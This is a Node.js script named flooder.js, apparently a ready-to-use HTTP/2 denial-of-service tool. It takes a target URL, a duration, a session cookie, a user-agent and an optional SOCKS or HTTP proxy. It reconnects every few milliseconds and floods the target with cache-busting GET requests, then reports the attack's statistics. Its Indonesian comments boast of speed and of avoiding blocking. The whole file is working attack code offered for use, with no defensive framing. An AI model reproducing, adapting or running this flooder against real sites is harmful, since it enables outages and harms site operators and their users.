const http2 = require("http2");
const crypto = require("crypto");
const { SocksProxyAgent } = require("socks-proxy-agent");
const { HttpsProxyAgent } = require("https-proxy-agent");

const target = process.argv[2];
const duration = parseInt(process.argv[3]);
const cookie = process.argv[4];
const userAgent = process.argv[5];
const proxy = process.argv[6];
const showLog = process.argv.includes("-log");

if (!target || !duration || !cookie || !userAgent) {
    console.log("Usage: node flooder.js <URL> <DURATION> <COOKIE> <USER-AGENT> [PROXY: ip:port] [-log]");
    process.exit(1);
}

// Stats
let req = 0, ok = 0, err = 0;

function randStr(len) {
    return crypto.randomBytes(len).toString("hex");
}

function buildHeaders(path, host) {
    return {
        ":authority": host,
        ":method": "GET",
        ":path": path + "?" + randStr(4),
        ":scheme": "https",
        "user-agent": userAgent,
        "cookie": cookie,
        "accept": "*/*",
        "accept-encoding": "gzip, deflate, br",
        "cache-control": "no-cache"
    };
}

// Build proxy if provided
function buildProxy(proxyStr) {
    if (!proxyStr) return null;
    if (proxyStr.includes("socks")) {
        return new SocksProxyAgent("socks://" + proxyStr);
    } else {
        return new HttpsProxyAgent("http://" + proxyStr);
    }
}
const proxyAgent = buildProxy(proxy);

// FAST + NON-BLOCKED RUNNER
function run() {
    const parsed = new URL(target);

    const client = http2.connect(parsed.origin, {
        rejectUnauthorized: false,
        ALPNProtocols: ["h2"],

        // Fast settings
        settings: {
            maxConcurrentStreams: 1000,
            initialWindowSize: 6291456,
            headerTableSize: 65536
        },

        createConnection: proxyAgent
            ? () => proxyAgent.connect(parsed)
            : undefined
    });

    client.on("error", () => { err++; client.destroy(); });

    client.on("connect", () => {
        const spam = setInterval(() => {
            try {
                const headers = buildHeaders(parsed.pathname, parsed.host);
                const stream = client.request(headers);

                stream.on("response", () => ok++);
                stream.on("error", () => err++);
                stream.end();

                req++;
            } catch {
                err++;
            }
        }, 80);        // ⚡ REQUEST SUPER CEPAT (5ms)

        setTimeout(() => {
            clearInterval(spam);
            client.close();
            client.destroy();
        }, 5000);     // cepat ganti koneksi agar tidak blocking
    });
}

// Always reconnect every few ms
const loop = setInterval(run, 5);  // ⚡ Ultra-fast reconnect

setTimeout(() => {
    clearInterval(loop);
    console.log("\nAttack finished:");
    console.log("Requests :", req);
    console.log("Success  :", ok);
    console.log("Errors   :", err);
    process.exit(0);
}, duration * 1000);

// Optional live stats
if (showLog) {
    setInterval(() => {
        console.clear();
        console.log("[HTTP/2 FAST]");
        console.log("Requests:", req);
        console.log("Success :", ok);
        console.log("Errors  :", err);
    }, 2000);
}
